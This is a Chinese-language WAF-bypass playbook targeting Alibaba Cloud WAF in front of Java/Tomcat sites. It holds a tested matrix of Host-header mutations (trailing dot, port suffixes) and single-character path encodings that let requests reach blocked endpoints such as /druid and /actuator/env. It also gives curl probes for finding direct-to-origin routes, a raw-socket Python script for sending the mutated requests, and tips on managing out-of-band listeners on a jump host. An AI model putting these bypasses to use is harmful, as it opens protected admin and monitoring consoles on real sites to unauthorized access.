# 云 WAF 规则集绕过 —— 实测矩阵 + 裸 socket 骨架

目标:Java/Tomcat 源站 + 阿里云 WAF(独享版 / inline)。以下全是**观测值,要逐项重测**:
规则集按域名配置且会变。

## 1. 四种响应类别(先分类,再选打法)

| 类别 | 识别特征 | 含义 |
|---|---|---|
| WAF 拦截 | 小段厂商 HTML,中文文案提到安全威胁/请求已被阻断 | 规则集命中,需绕过 |
| 源站 4xx | Spring Boot JSON 带 `timestamp`/`status`/`path` | 请求已到应用 ⇒ 这一发已被放行 |
| 502 Bad Gateway | 厂商/Apache 错误页 | WAF 转给了不存在的默认上游 —— Host 不在已配置域名表里 |
| 400 Bad Request | 框架解析错误 | 畸形归一化到了应用,不是绕过 |

用响应体里有无文案做程序化判定,**不要只看状态码**(路径绕过常返回 302、尾点 Host 返回 200,都不是 403)。

## 2. Host 行变形(优先试)

路径 `/druid/index.html`,同一 IP、同一 SNI:

| 发出的 Host | 结果 | 结论 |
|---|---|---|
| `target.com` | 403 拦截页 | 基线 |
| `target.com.`(尾点) | 200 | **绕过** |
| `target.com:443` | 200 | **绕过** |
| `target.com:80`(假端口) | 200 | **绕过** |
| `target.com.:443` | 200 | **绕过** |
| `TARGET.COM` / `Target.Com` | 403 拦截页 | 大小写被归一化,无效 |
| `target.com\t`(尾 TAB) | 502 | 路由丢失 |
| `target.com `(尾空格) | 403 拦截页 | 被 trim,无效 |
| `target.com..` | 400 | 无效 |
| 无关域名 / `target.com.evil.com` / `target.com@127.0.0.1` | 502 | 无默认上游 |

后端能容忍尾点与端口后缀,**而 WAF 的域名绑定是精确字符串比较** —— 这就是缺口。

## 3. 路径编码(Host 保持正常)

有效 —— 只编码被拦关键词里的一个字符:

| 路径 | 结果 |
|---|---|
| `/%64ruid/index.html` | **302,已路由** |
| `/dru%69d/index.html` | **302,已路由** |

无效(保持拦截或退化为 400):`//druid//`、`/./druid/`、`/a/../druid/`、`/druid;/`、
`/druid/index.html;`、`/druid/..;/`、`/druid/a/../index.html`、`/druid/index.html%00`、
`%20`、`%23`、`%3f`、`/druid%20/`、`/druid\index.html`、`/druid/index%2Ehtml`、
`/druid/index.html//`、`/druid/index.html/.`、`/%252e…`、`%252f`。

规律:一个字符、且在关键词内部。比这更花的写法对这家厂商基本是死的。

## 4. 判定 inline / DNS 前置

```bash
curl -sk -o /dev/null -w '%{http_code}\n' --resolve target.com:443:IP https://target.com/actuator/env
curl -sk -o /dev/null -w '%{http_code}\n' --resolve target.com:443:IP https://target.com/druid/index.html
```

- 直连 IP 干净 ⇒ DNS 前置,直连就是总旁路。
- 直连 IP 仍回拦截页 ⇒ inline WAF,别再找源站,转而改 Host 行。
- 每个 IP 都先发一发控制组请求再下结论。

## 5. 裸 socket 骨架

普通 HTTP 客户端会从 URL 重写 Host,表达不出变形。SNI 保持真实域名让 TLS 先握上,只变 `Host:` 行。

```python
import ssl, socket

HOST = "target.com"          # 用于 SNI
IP   = "203.0.113.10"
MARK = "安全威胁"            # 厂商拦截页标记

def send(method, target, host, extra="", ip=IP, timeout=12):
    req = (f"{method} {target} HTTP/1.1\r\nHost: {host}\r\n"
           f"User-Agent: Mozilla/5.0\r\nAccept: */*\r\n"
           f"Connection: close\r\n{extra}\r\n").encode()
    s = socket.create_connection((ip, 443), timeout=timeout)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ss = ctx.wrap_socket(s, server_hostname=HOST)
    ss.sendall(req)
    buf = b""
    ss.settimeout(timeout)
    try:
        while len(buf) < 4000:
            d = ss.recv(4000)
            if not d:
                break
            buf += d
    except Exception:
        pass
    ss.close()
    return buf

def verdict(b):
    return "WAF" if MARK in b.decode("utf-8", "replace") else "PASS"
```

把矩阵当 `(路径, Host)` 对扫,只打印非 `WAF` 的行 + 状态行 —— 要的是哪种归一化能过去,不是响应体。

## 6. 走跳板机时的监听纪律

探测要在远端架 OOB 监听时,杀监听用**端口**不用模式:
`fuser -k 8899/tcp`,绝不用 `pkill -f "http.server 8899"` ——
模式会匹配远端 shell 自己那条命令行,把会话带走,回空输出 + exit 0。
